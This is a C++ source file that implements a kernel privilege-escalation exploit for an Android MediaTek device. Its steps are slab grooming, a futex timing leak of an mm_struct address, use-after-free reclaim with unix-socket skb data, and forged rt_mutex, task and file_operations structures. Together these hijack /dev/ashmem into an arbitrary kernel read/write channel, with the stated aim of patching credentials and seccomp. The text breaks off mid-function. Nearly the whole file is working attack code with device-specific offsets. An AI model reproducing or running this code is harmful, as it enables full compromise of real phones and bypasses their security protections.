//
// page_engine.cpp — port of the Payload's (src/61) kernel-page reclaim
// engine + fake-page payload + configfs arbitrary R/W channel, adapted to
// MT6989 (PLF110, kernel 6.1.157) with BTF/kallsyms/Image-verified offsets.
//
// Architecture (the Payload's — ONE constrained write in total):
//   1. Groom mm_struct slabs with paused clone children whose mm stays
//      pinned by /proc/<pid>/mem fds (closing the fd frees the mm).
//   2. KernelSnitch (futex hash-bucket timing side channel) leaks the
//      victim mm_struct address.
//   3. Free the victim's slab and reclaim it with unix-socket skb data
//      carrying our payload — the fake page now lives at a known kernel
//      address.
//   4. ONE canvas fire: *(miscdevice.fops) = fake_fops (P0-alias target,
//      KASLR-free).
//   5. Open /dev/ashmem: the new fd's f_op is our fake table whose
//      read_iter/write_iter are the REAL configfs functions; the ashmem
//      name (ASHMEM_SET_NAME blob) doubles as a forged configfs_buffer
//      -> arbitrary kernel read/write.
//   6. Leak KASLR from the original ashmem_fops table, rewrite the fake
//      table's function pointers, then patch creds/seccomp at leisure.
//
#include "page_engine.h"

#include <algorithm>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <cerrno>
#include <cstring>
#include <sched.h>
#include <cstdio>
#include <cstdlib>

#include "aliases.h"

#include <android/log.h>
static void ks_log(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    __android_log_print(ANDROID_LOG_INFO, "gl_page", "%s", buf);
}

/* the KernelSnitch engine lives in ks_bridge.c (C dialect headers); this
 * TU drives it through the bridge ABI. */
extern "C" {
void *ks_setup(size_t mm_sz, size_t order, size_t threads, size_t collisions);
void ks_find_collisions(void *ks);
int ks_found(void *ks);
void ks_bruteforce(void *ks);
uintptr_t ks_mm(void *ks);
void ks_cleanup(void *ks);
void ks_pin(int core);
void ks_reset_pin(void);
}

namespace pe {

/* ── MT6989 constants (BTF + kallsyms + kernel-Image verified) ──────────── */
// image-relative offsets: va = KIMAGE_TEXT_BASE + off;
// P0 data alias = LINEAR_MAP_BASE + off (aliases.h).
constexpr uint64_t IMG_ASHMEM_MISC_FOPS   = 0x219f340ULL; // miscdevice.fops (Image scan: sole ptr to ashmem_fops)
constexpr uint64_t IMG_ASHMEM_FOPS        = 0x11ecf88ULL; // original file_operations (kallsyms)
constexpr uint64_t IMG_CONFIGFS_READ_ITER      = 0xAAABD0ULL;
constexpr uint64_t IMG_CONFIGFS_BIN_WRITE_ITER = 0xAAB100ULL;
constexpr uint64_t IMG_ASHMEM_IOCTL       = 0x5416FCULL;
constexpr uint64_t IMG_ASHMEM_MMAP        = 0x542354ULL;
constexpr uint64_t IMG_ASHMEM_OPEN        = 0x542584ULL;
constexpr uint64_t IMG_ASHMEM_RELEASE     = 0x54260CULL;
constexpr uint64_t IMG_ASHMEM_SHOW_FDINFO = 0x9A4018ULL;
constexpr uint64_t IMG_NOOP_LLSEEK        = 0x20493CULL;
constexpr uint64_t IMG_GEN_FILE_SPLICE_READ = 0x444414ULL;
constexpr uint64_t IMG_ROOT_TASK_GROUP    = 0x222A580ULL;
constexpr uint64_t IMG_INIT_TASK          = 0x203FC00ULL;
constexpr uint64_t IMG_ZERO_WINDOW        = 0x671458ULL;  // _printk_rb_static_infos: unused, 0x58000 of zeros past this

// struct file_operations (BTF, size 0x110)
enum : size_t {
    FOPS_LLSEEK_OFF = 0x08, FOPS_READ_ITER_OFF = 0x20,
    FOPS_WRITE_ITER_OFF = 0x28, FOPS_IOCTL_OFF = 0x50,
    FOPS_COMPAT_IOCTL_OFF = 0x58, FOPS_MMAP_OFF = 0x60,
    FOPS_MMAP_SUPPORTED_FLAGS_OFF = 0x68,
    FOPS_OPEN_OFF = 0x70, FOPS_FLUSH_OFF = 0x78,
    FOPS_RELEASE_OFF = 0x80,
    FOPS_SPLICE_READ_OFF = 0xc8, FOPS_SHOW_FDINFO_OFF = 0xe0,
};
// struct configfs_buffer (BTF, size 0x80)
enum : size_t {
    CFG_PAGE_OFF = 0x10, CFG_NEEDS_READ_FILL_OFF = 0x50,
    CFG_BIN_BUFFER_OFF = 0x58, CFG_BIN_BUFFER_SIZE_OFF = 0x60,
    CFG_CB_MAX_SIZE_OFF = 0x64,
};
// struct rt_mutex_waiter (BTF, size 0x58)
enum : size_t {
    FW_PI_TREE_ENTRY = 0x18, FW_TASK = 0x30, FW_LOCK = 0x38,
    FW_WAKE_STATE = 0x40, FW_PRIO = 0x44, FW_DEADLINE = 0x48,
    FW_WW_CTX = 0x50,
};
// struct task_struct fake fields (BTF)
enum : size_t {
    FT_USAGE = 0x40, FT_PRIO = 0x84, FT_NORMAL_PRIO = 0x8c,
    FT_TASK_GROUP = 0x348, FT_PI_LOCK = 0x924,
    FT_PI_WAITERS = 0x938, FT_PI_TOP = 0x948,
    FT_PI_BLOCKED_ON = 0x950,
};
// fake-page internal layout (tegu geometry, all inside one order-3 page)
enum : size_t {
    PG_FOPS = 0x1000, PG_LOCK = 0x1350, PG_SCRATCH = 0x3000,
    PG_FAKE_TASK = 0x3200, PG_W0 = 0x2220, PG_RIGHT = 0x4440,
    PG_LEFT = 0x5550,
};
static constexpr size_t PG_ALT_LOCKS[] = {0x1120, 0x11b0, 0x1240, 0x12c8};
static constexpr size_t PG_ALT_W0S[]   = {0x1150, 0x11e0, 0x1270, 0x12f8};

/* /proc/slabinfo on THIS device: object_size=1024, 32/slab, order-3.
 * The BTF struct size (0x3c0) is NOT the slab stride -- SLUB pads to
 * 0x400; stepping candidates by 960 aimed the whole engine at a wrong
 * grid (the leak + close choreography + objs_per_slab all misaligned). */
constexpr size_t MM_STRUCT_SZ = 0x400;
constexpr int    MM_ORDER = 3;
constexpr int    MM_PARTIALS = 5;
constexpr int    KSNITCH_COLLISIONS = 4;  /* Payload value. 3 gave only 2
    hash-equality constraints (22 bits, bucket-index compare) over 2^26
    candidates -> ~16 expected false matches, first-match-wins picks one in
    an unmapped hole (every fire panicked at wait_lock trylock). 4 gives 3
    constraints -> expected false matches < 0.01. */
constexpr size_t ORDER3_SIZE = 4096u << MM_ORDER;
constexpr size_t SKB_SEND_SIZE = ORDER3_SIZE * 2;
/* skb data-page offset (tegu's value; kernel-build specific). Probed
 * per attempt: a wrong delta makes the fire walk garbage -> panic. */
static int64_t SKB_DATA_DELTA = -0xe80;
void set_skb_delta(int64_t d) { SKB_DATA_DELTA = d; }
constexpr int    SKB_RECLAIM_SENDS = 4;
constexpr int    FOPS_PAGE_ATTEMPTS = 72;
constexpr int    FAKE_WAITER_PRIO = 130;
constexpr int    FAKE_TASK_PRIO = 120;
constexpr int    ASHMEM_NAME_LEN = 256;
constexpr int    CORE = 4;
constexpr unsigned ASHMEM_SET_NAME_IOC = 0x41007701u; // _IOW(0x77,1,char[256])
constexpr uint64_t ASHMEM_PREFIX_COUNT = 0x6d6873612f766564ULL; // "dev/ashm"

// PLF110 ashmem_ioctl stores ASHMEM_SET_NAME at ashmem_area + 0xb.  The first
// 11 bytes retain "dev/ashmem/" and form configfs_buffer.count/pos.
static const int k_prefix_candidates[3] = {11, 16, 4};
static int g_prefix_idx = 0;

/* ── state ─────────────────────────────────────────────────────────────── */
static uintptr_t page_base = 0, fake_lock = 0, fake_w0 = 0,
                 fake_task = 0, fake_fops = 0, binwrite_target = 0;
static uint64_t kaslr_base = 0;
static int rw_fd = -1;
static int ashmem_dev_fd = -1;

struct mm_ctx { size_t mm_cnt = 0; pid_t *childs = nullptr; int *memfds = nullptr; };
static mm_ctx prepare_ctx, spray_ctx, pre_ctx, post_ctx;
static size_t mm_objs_per_slab = 0;
static pid_t child_leak = 0;
static int memfd_leak = -1;
static int reclaim_sv[2] = {-1, -1};
static unsigned char *skb_buf = nullptr;
static void *ks = nullptr;

/* ── helpers ───────────────────────────────────────────────────────────── */
uintptr_t alias(uint64_t img_off) { return LINEAR_MAP_BASE + img_off; }
uintptr_t text_addr(uint64_t img_off) {
    return kaslr_base ? (kaslr_base + img_off) : (KIMAGE_TEXT_BASE + img_off);
}

static void put64(unsigned char *p, size_t off, uint64_t v) { memcpy(p + off, &v, 8); }
static void put32(unsigned char *p, size_t off, uint32_t v) { memcpy(p + off, &v, 4); }

static pid_t clone_child(void) {
    pid_t child = syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0);
    if (child == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
        if (getppid() == 1) _exit(0);
        ks_pin(CORE);
        for (;;) pause();
    }
    return child;
}

static pid_t clone_leak_child(void) {
    pid_t child = syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0);
    if (child == 0) {
        ks_find_collisions(ks);
        exit(0);
    }
    return child;
}

static int open_memfd(pid_t child) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", child);
    return open(path, O_RDONLY | O_CLOEXEC);
}

static void kill_child(pid_t child) {
    if (child <= 0) return;
    kill(child, SIGKILL);
    waitpid(child, nullptr, 0);
}

/* /proc/<pid>/mem holds an mmgrab() reference after the task exits.  In the
 * standalone shell flow it is harmless to keep every helper alive, but an
 * Android app is subject to ActivityManager's global phantom-process cap.
 * Eager mode therefore reaps each helper immediately while retaining the fd;
 * the mm_struct allocation and later fd-driven free order stay unchanged. */
static void pin_mm_range(pid_t *children, int *memfds, size_t count) {
    const size_t batch_size = 16;
    for (size_t base = 0; base < count; base += batch_size) {
        const size_t end = std::min(base + batch_size, count);
        for (size_t i = base; i < end; ++i) {
            children[i] = clone_child();
            memfds[i] = children[i] > 0 ? open_memfd(children[i]) : -1;
        }
        for (size_t i = base; i < end; ++i) {
            kill_child(children[i]);
            children[i] = -1;
        }
    }
}

static void close_ctx_memfds(mm_ctx *ctx) {
    for (size_t i = 0; i < ctx->mm_cnt; i++)
        if (ctx->memfds[i] > 0) { close(ctx->memfds[i]); ctx->memfds[i] = -1; }
}

static void free_ctx(mm_ctx *ctx) {
    free(ctx->childs); free(ctx->memfds);
    ctx->childs = nullptr; ctx->memfds = nullptr; ctx->mm_cnt = 0;
}

static void cleanup(void) {
    close_ctx_memfds(&prepare_ctx);
    close_ctx_memfds(&spray_ctx);
    close_ctx_memfds(&pre_ctx);
    close_ctx_memfds(&post_ctx);
    if (memfd_leak > 0) { close(memfd_leak); memfd_leak = -1; }
    free_ctx(&prepare_ctx); free_ctx(&spray_ctx);
    free_ctx(&pre_ctx); free_ctx(&post_ctx);
    free(skb_buf); skb_buf = nullptr;
    if (reclaim_sv[0] >= 0) { close(reclaim_sv[0]); close(reclaim_sv[1]);
                              reclaim_sv[0] = reclaim_sv[1] = -1; }
}

static void prepare_ctxs(void) {
    prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;  /* shell-proven counts: ran cleanly dozens of times today */
    prepare_ctx.childs = (pid_t *) calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
    prepare_ctx.memfds = (int *) calloc(sizeof(int), prepare_ctx.mm_cnt);
    spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
    spray_ctx.childs = (pid_t *) calloc(sizeof(pid_t), spray_ctx.mm_cnt);
    spray_ctx.memfds = (int *) calloc(sizeof(int), spray_ctx.mm_cnt);
    pre_ctx.mm_cnt = mm_objs_per_slab - 1;
    pre_ctx.childs = (pid_t *) calloc(sizeof(pid_t), pre_ctx.mm_cnt);
    pre_ctx.memfds = (int *) calloc(sizeof(int), pre_ctx.mm_cnt);
    post_ctx.mm_cnt = mm_objs_per_slab;
    post_ctx.childs = (pid_t *) calloc(sizeof(pid_t), post_ctx.mm_cnt);
    post_ctx.memfds = (int *) calloc(sizeof(int), post_ctx.mm_cnt);
}

/* ── fake page content ─────────────────────────────────────────────────── */
static void put_fake_fops_table(unsigned char *p, size_t off) {
    memset(p + off, 0, 0x110);
    put64(p, off + FOPS_LLSEEK_OFF, fake_w0 + FW_PI_TREE_ENTRY);
    put64(p, off + FOPS_READ_ITER_OFF,      text_addr(IMG_CONFIGFS_READ_ITER));
    put64(p, off + FOPS_WRITE_ITER_OFF,     text_addr(IMG_CONFIGFS_BIN_WRITE_ITER));
    put64(p, off + FOPS_IOCTL_OFF,          text_addr(IMG_ASHMEM_IOCTL));
    put64(p, off + FOPS_MMAP_OFF,           text_addr(IMG_ASHMEM_MMAP));
    put64(p, off + FOPS_OPEN_OFF,           text_addr(IMG_ASHMEM_OPEN));
    put64(p, off + FOPS_RELEASE_OFF,        text_addr(IMG_ASHMEM_RELEASE));
    put64(p, off + FOPS_SPLICE_READ_OFF,    text_addr(IMG_GEN_FILE_SPLICE_READ));
    put64(p, off + FOPS_SHOW_FDINFO_OFF,    text_addr(IMG_ASHMEM_SHOW_FDINFO));
}

static int prepare_skb_payload(uintptr_t base) {
    memset(skb_buf, 0, SKB_SEND_SIZE);
    /* PLF110 keeps the pselect payload geometry.  In particular the slab
     * object at +0x3000 is repopulated by the post-spray on this kernel, so
     * Pixel's MAIN_TCP fake_fops@+0x3338 is overwritten by mm_struct fields.
     * PG_FOPS@+0x1000 shares the empirically preserved object containing
     * fake_lock@+0x1350 and does not overlap it. */
    uintptr_t payload_base = base;
    size_t payload_bias = 0xe80;
    fake_lock  = payload_base + PG_LOCK;
    fake_w0    = payload_base + PG_W0;
    fake_task  = payload_base + 0x5800;
    fake_fops  = payload_base + PG_FOPS;
    binwrite_target = payload_base + PG_SCRATCH;

    uintptr_t write_pc    = fake_fops;                 // tree_pc / pi_parent
    uintptr_t write_right = 0;
    uintptr_t write_left  = alias(IMG_ASHMEM_MISC_FOPS);  // tree_left / pi_left
    /* Payload FOPS mode uses TEXT addresses for the task pointers in the
     * page (waiter_task/W0.task = init_task, task_group, pi_top_task):
     * the walk compares task pointers, and an aliased (linear-map) init_task
     * never equals the text one. fake_task stays a page pointer -- the lock
     * OWNER. */
    uint64_t waiter_task  = text_addr(IMG_INIT_TASK);
    uint64_t task_group   = text_addr(IMG_ROOT_TASK_GROUP);
    uint64_t pi_top_task  = text_addr(IMG_INIT_TASK);

    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
        unsigned char *p = skb_buf + chunk + payload_bias;

        // fake rt_mutex: wait_lock unlocked, waiters -> fake_w0,
        // owner = fake_task|RT_MUTEX_HAS_WAITERS(1). The owner field is
        // what makes the chain walk process the lock's waiter tree and
        // erase W0 (the constrained write): with owner NULL the walk takes
        // the unowned-lock exit and returns 0 having written NOTHING
        // (measured: 8/8 quiet non-landings in the app fire stage).
        put32(p, PG_LOCK + 0x00, 0);
        put64(p, PG_LOCK + 0x08, fake_w0);
        put64(p, PG_LOCK + 0x10, fake_w0);
        put64(p, PG_LOCK + 0x18, fake_task | 1);

        // fake waiter W0 (fully self-consistent with the fake lock)
        put64(p, PG_W0 + 0x00, 1);                    // tree parent_color: red, no parent
        put64(p, PG_W0 + 0x08, 0);
        put64(p, PG_W0 + 0x10, 0);
        put32(p, PG_W0 + 0x18, FAKE_WAITER_PRIO);     // tree prio
        put64(p, PG_W0 + 0x20, 0);                    // tree deadline
        put64(p, PG_W0 + FW_PI_TREE_ENTRY + 0x00, write_pc);
        put64(p, PG_W0 + FW_PI_TREE_ENTRY + 0x08, write_right);
        put64(p, PG_W0 + FW_PI_TREE_ENTRY + 0x10, write_left);
        put32(p, PG_W0 + 0x40, FAKE_WAITER_PRIO);     // pi_tree prio alias
        put64(p, PG_W0 + 0x48, 0);
        put64(p, PG_W0 + FW_TASK, waiter_task);
        put64(p, PG_W0 + FW_LOCK, fake_lock);
        put32(p, PG_W0 + FW_WAKE_STATE, 0);
        put64(p, PG_W0 + FW_WW_CTX, 0);

        /* Extra independent one-shot locks in the same empirically preserved
         * 0x1000 slab object as the fops table.  A lock is never reused after
         * a fire; these provide additional race attempts without reclaiming
         * another page or following a stale rb child. */
        for (size_t alt = 0; alt < sizeof(PG_ALT_LOCKS) / sizeof(PG_ALT_LOCKS[0]); alt++) {
            size_t lo = PG_ALT_LOCKS[alt];
            size_t wo = PG_ALT_W0S[alt];
            uintptr_t lock_addr = payload_base + lo;
            uintptr_t w0_addr = payload_base + wo;
            put32(p, lo + 0x00, 0);
            put64(p, lo + 0x08, w0_addr);
            put64(p, lo + 0x10, w0_addr);
            put64(p, lo + 0x18, fake_task | 1);
            put64(p, wo + 0x00, 1);
            put64(p, wo + 0x08, 0);
            put64(p, wo + 0x10, 0);
            put32(p, wo + 0x18, FAKE_WAITER_PRIO);
            put64(p, wo + 0x20, 0);
            put64(p, wo + FW_PI_TREE_ENTRY + 0x00, write_pc);
            put64(p, wo + FW_PI_TREE_ENTRY + 0x08, write_right);
            put64(p, wo + FW_PI_TREE_ENTRY + 0x10, write_left);
            put32(p, wo + 0x40, FAKE_WAITER_PRIO);
            put64(p, wo + 0x48, 0);
            put64(p, wo + FW_TASK, waiter_task);
            put64(p, wo + FW_LOCK, lock_addr);
            put32(p, wo + FW_WAKE_STATE, 0);
            put64(p, wo + FW_WW_CTX, 0);
        }

        // fake task: alive-looking, no PI state, root task_group
        put32(p, 0x5800 + FT_USAGE, 0x100);
        put32(p, 0x5800 + FT_PRIO, FAKE_TASK_PRIO);
        put32(p, 0x5800 + FT_NORMAL_PRIO, FAKE_TASK_PRIO);
        put32(p, 0x5800 + FT_PI_LOCK, 0);
        put64(p, 0x5800 + FT_PI_WAITERS + 0x00, 0);
        put64(p, 0x5800 + FT_PI_WAITERS + 0x08, 0);
        put64(p, 0x5800 + FT_TASK_GROUP, task_group);
        put64(p, 0x5800 + FT_PI_TOP, pi_top_task);
        put64(p, 0x5800 + FT_PI_BLOCKED_ON, 0);

        // benign rb termination nodes for parent-chasing walks
        put64(p, PG_RIGHT + 0x00, write_pc);
        put64(p, PG_RIGHT + 0x08, 0);
        put64(p, PG_RIGHT + 0x10, 0);
        put64(p, PG_LEFT + 0x00, write_pc);
        put64(p, PG_LEFT + 0x08, 0);
        put64(p, PG_LEFT + 0x10, 0);

        put_fake_fops_table(p, PG_FOPS);
    }
    return 1;
}

/* ── the reclaim dance (Payload prepare_kernel_page body) ──────────────── */
static uintptr_t prepare_kernel_page_once(void) {
    if (reclaim_sv[0] >= 0) { close(reclaim_sv[0]); close(reclaim_sv[1]);
                              reclaim_sv[0] = reclaim_sv[1] = -1; }
    mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
    prepare_ctxs();   /* (was missing: NULL ctx arrays, no children, and the
                         NULL skb_buf memset was the SIGSEGV) */
    if (!skb_buf) {
        skb_buf = (unsigned char *) malloc(SKB_SEND_SIZE);
        memset(skb_buf, 0x41, SKB_SEND_SIZE);
    }

    pin_mm_range(prepare_ctx.childs, prepare_ctx.memfds, prepare_ctx.mm_cnt);
    pin_mm_range(spray_ctx.childs, spray_ctx.memfds, spray_ctx.mm_cnt);
    int cpu_count = (int) sysconf(_SC_NPROCESSORS_ONLN);
    ks = ks_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS);
    pin_mm_range(pre_ctx.childs, pre_ctx.memfds, pre_ctx.mm_cnt);
    child_leak = clone_leak_child();
    pin_mm_range(post_ctx.childs, post_ctx.memfds, post_ctx.mm_cnt);
    memfd_leak = open_memfd(child_leak);
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) kill_child(pre_ctx.childs[i]);
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) kill_child(post_ctx.childs[i]);
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) kill_child(spray_ctx.childs[i]);
    waitpid(child_leak, nullptr, 0);

    if (!ks_found(ks)) {
        ks_cleanup(ks); ks = nullptr;
        for (size_t i = 0; i < prepare_ctx.mm_cnt; i++)
            kill_child(prepare_ctx.childs[i]);
        cleanup();
        return 0;
    }

    ks_bruteforce(ks);
    uintptr_t leaked = ks_mm(ks);
    if (leaked == (uintptr_t) -1) {
        ks_cleanup(ks); ks = nullptr;
        for (size_t i = 0; i < prepare_ctx.mm_cnt; i++)
            kill_child(prepare_ctx.childs[i]);
        cleanup();
        return 0;
    }

    uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
    if (!prepare_skb_payload(base)) {
        ks_cleanup(ks); ks = nullptr; cleanup();
        return 0;
    }

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv) != 0) { cleanup(); return 0; }
    int sndbuf = 1 << 20;
    setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int fl = fcntl(reclaim_sv[0], F_GETFL, 0);
    if (fl >= 0) fcntl(reclaim_sv[0], F_SETFL, fl | O_NONBLOCK);

    int pcp_shaping_sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv) != 0) { cleanup(); return 0; }

    struct iovec iov;
    memset(&iov, 0, sizeof(iov));
    iov.iov_base = skb_buf;
    iov.iov_len = SKB_SEND_SIZE;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    if (sendmsg(pcp_shaping_sv[0], &msg, 0) < 0) { /* best effort */ }

    ks_pin(CORE);
    sched_yield(); sched_yield(); sched_yield(); sched_yield();
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
        close(pre_ctx.memfds[i]); pre_ctx.memfds[i] = -1;
    }
    for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
        close(post_ctx.memfds[i]); post_ctx.memfds[i] = -1;
    }
    for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
        close(spray_ctx.memfds[i]); spray_ctx.memfds[i] = -1;
    }

    close(pcp_shaping_sv[0]);
    close(pcp_shaping_sv[1]);
    sched_yield(); sched_yield(); sched_yield(); sched_yield();
    close(memfd_leak);          // victim mm_struct frees NOW
    memfd_leak = -1;

    /* skb-only reclaim, exactly the Payload dance (the pipe spray variant
     * was removed: the freed order-3 block sits on the order-3 pcp list
     * where only the skb page_frag path can see it; order-0 pipe pages
     * refill from the buddy and never touch it). */
    for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
        if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) <= 0) break;
    }
    ks_cleanup(ks); ks = nullptr;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
        close(prepare_ctx.memfds[i]); prepare_ctx.memfds[i] = -1;
        kill_child(prepare_ctx.childs[i]);
    }
    return base;
}

bool prepare_page(void) {
    for (int attempt = 1; attempt <= FOPS_PAGE_ATTEMPTS; attempt++) {
        uintptr_t base = prepare_kernel_page_once();
        if (base) {
            page_base = base;
            return true;
        }
    }
    return false;
}

/* ── ashmem / configfs R/W channel ─────────────────────────────────────── */
static int open_ashmem(void) {
    return open("/dev/ashmem", O_RDWR | O_CLOEXEC);
}

static int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
    char name[ASHMEM_NAME_LEN];
    memset(name, 0x41, sizeof(name));
    for (size_t i = 0; i < len; i++) name[i] = blob[i] ? blob[i] : 1;
    name[len] = 0;
    return ioctl(fd, ASHMEM_SET_NAME_IOC, name);
}

static int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
    char name[ASHMEM_NAME_LEN];
    memset(name, 0x41, sizeof(name));
    for (size_t i = 0; i < pos; i++) name[i] = blob[i] ? blob[i] : 1;
    name[pos] = 0;
    return ioctl(fd, ASHMEM_SET_NAME_IOC, name);
}

static int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
    if (try_put_blob_no_zeros(fd, blob, len) != 0) return -1;
    for (size_t i = len; i > 0; i--) {
        if (blob[i - 1] == 0 && try_put_blob_zero_at(fd, blob, i - 1) != 0)
            return -1;
    }
    return 0;
}

static bool has_zero_byte(uintptr_t value) {
    for (size_t i = 0; i < sizeof(value); i++) {
        if (((value >> (i * 8)) & 0xffu) == 0) return true;
    }
    return false;
}

// write `len` bytes at kernel `target`
static ssize_t configfs_write_once(int fd, uintptr_t target,
                                   const void *data, size_t len) {
    unsigned char blob[128];
    memset(blob, 0, sizeof(blob));
    int prefix = k_prefix_candidates[g_prefix_idx];
    /* PLF110's optimized strscpy clears the rest of the current machine word
     * after a NUL.  A target ending in 00 would therefore zero the complete
     * bin_buffer pointer.  Encode target as bin_buffer + ki_pos and choose a
     * small position that makes every stored pointer byte nonzero. */
    off_t pos = 0;
    uintptr_t encoded_target = target;
    for (off_t candidate = 0; candidate <= 0x10000; candidate++) {
        uintptr_t encoded = target - (uintptr_t) candidate;
        if (!has_zero_byte(encoded)) {
            pos = candidate;
            encoded_target = encoded;
            break;
        }
    }
    if (has_zero_byte(encoded_target) || len > UINT32_MAX - (uint64_t) pos) {
        errno = EOVERFLOW;
        return -1;
    }
    put64(blob, CFG_BIN_BUFFER_OFF - prefix, encoded_target);
    put32(blob, CFG_BIN_BUFFER_SIZE_OFF - prefix, (uint32_t) (pos + len));
    put32(blob, CFG_CB_MAX_SIZE_OFF - prefix, 0);
    if (try_set_ashmem_name_blob(fd, blob, sizeof(blob)) != 0) return -1;
    return pwrite(fd, data, len, pos);
}

// read `len` bytes from kernel `target`
static ssize_t configfs_read_once(int fd, uintptr_t target,
                                  void *data, size_t len) {
    unsigned char blob[128];
    memset(blob, 0, sizeof(blob));
    int prefix = k_prefix_candidates[g_prefix_idx];
    /* count is the immutable first eight bytes, "dev/ashm".  Choose ki_pos
     * so configfs_read_iter computes count - pos == len. */
    off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
    uintptr_t page = target - (uintptr_t) pos;
    put64(blob, CFG_PAGE_OFF - prefix, page);
    put32(blob, CFG_NEEDS_READ_FILL_OFF - prefix, 0);
    if (try_set_ashmem_name_blob(fd, blob, sizeof(blob)) != 0) return -1;
    return pread(fd, data, len, pos);
}

bool kread(uint64_t target, void *buf, size_t len) {
    if (rw_fd < 0) return false;
    return configfs_read_once(rw_fd, target, buf, len) == (ssize_t) len;
}

bool kwrite(uint64_t target, const void *buf, size_t len) {
    if (rw_fd < 0) return false;
    return configfs_write_once(rw_fd, target, buf, len) == (ssize_t) len;
}

uint64_t kernel_read64(uint64_t target) {
    uint64_t v = 0;
    return kread(target, &v, 8) ? v : 0;
}

bool kernel_write64(uint64_t target, uint64_t v) {
    return kwrite(target, &v, 8);
}

/* verify the fops swap landed, then arm and self-test the R/W. If the
 * swap landed but the self-test fails, the ashmem name-prefix assumption
 * is wrong -- advance the prefix candidate and retry before giving up. */
int try_rw(void) {
    int fd = open_ashmem();
    if (fd < 0) {
        fprintf(stderr, "[rw] open ashmem failed errno=%d\n", errno);
        return -1;
    }
    uint64_t cur = 0;
    bool swap_verified = false;
    for (int tries = 0; tries < 3; tries++) {
        errno = 0;
        ssize_t n = configfs_read_once(fd, alias(IMG_ASHMEM_MISC_FOPS),
                                       &cur, sizeof(cur));
        fprintf(stderr, "[rw] verify prefix=%d n=%zd errno=%d cur=%016llx want=%016llx\n",
                k_prefix_candidates[g_prefix_idx], n, errno,
                (unsigned long long) cur, (unsigned long long) fake_fops);
        if (n == (ssize_t) sizeof(cur) && cur == fake_fops) {
            swap_verified = true;
            break;
        }
        g_prefix_idx = (g_prefix_idx + 1) % 3;
    }
    if (!swap_verified) {
        /* The misc fops write may have landed even when the configfs
         * read-back did not.  In that case this fd already owns fake_fops,
         * whose flush slot can still contain the live mm_struct list head at
         * +0x78.  Closing it before refresh_fake_fops_text() deterministically
         * trips CFI in filp_close().  Keep the fd pinned; the caller parks on
         * total failure, and a later successful attempt sanitizes the table. */
        return -1;
    }
    /* swap landed: the R/W channel must work with SOME prefix */
    for (int tries = 0; tries < 3; tries++) {
        rw_fd = fd;
        char marker[] = "RW_OK_0123456789";
        if (configfs_write_once(fd, binwrite_target, marker, sizeof(marker))
                == (ssize_t) sizeof(marker)) {
            char back[sizeof(marker)] = {0};
            if (configfs_read_once(fd, binwrite_target, back, sizeof(back))
                    == (ssize_t) sizeof(back) &&
                memcmp(back, marker, sizeof(marker)) == 0) {
                return rw_fd;
            }
        }
        g_prefix_idx = (g_prefix_idx + 1) % 3;   // try next prefix
    }
    rw_fd = -1;
    /* Same rule as the verification failure above: do not close a possibly
     * fake-fops fd until the flush slot has been sanitized. */
    return -1;
}

/* KASLR from the ORIGINAL ashmem_fops table via the P0 alias */
bool leak_kernel_base(void) {
    uint64_t open_ptr = kernel_read64(alias(IMG_ASHMEM_FOPS) + FOPS_OPEN_OFF);
    if ((open_ptr >> 48) != 0xffff) return false;
    kaslr_base = open_ptr - IMG_ASHMEM_OPEN;
    // cross-check three more entries
    uint64_t ioctl_ptr = kernel_read64(alias(IMG_ASHMEM_FOPS) + FOPS_IOCTL_OFF);
    uint64_t mmap_ptr  = kernel_read64(alias(IMG_ASHMEM_FOPS) + FOPS_MMAP_OFF);
    if (ioctl_ptr != kaslr_base + IMG_ASHMEM_IOCTL) return false;
    if (mmap_ptr  != kaslr_base + IMG_ASHMEM_MMAP)  return false;
    return true;
}

/* rewrite the fake table's function pointers with the slid addresses */
bool refresh_fake_fops_text(void) {
    struct { size_t off; uint64_t img; } slots[] = {
        {FOPS_READ_ITER_OFF,   IMG_CONFIGFS_READ_ITER},
        {FOPS_WRITE_ITER_OFF,  IMG_CONFIGFS_BIN_WRITE_ITER},
        {FOPS_IOCTL_OFF,       IMG_ASHMEM_IOCTL},
        {FOPS_MMAP_OFF,        IMG_ASHMEM_MMAP},
        {FOPS_OPEN_OFF,        IMG_ASHMEM_OPEN},
        {FOPS_RELEASE_OFF,     IMG_ASHMEM_RELEASE},
        {FOPS_SPLICE_READ_OFF, IMG_GEN_FILE_SPLICE_READ},
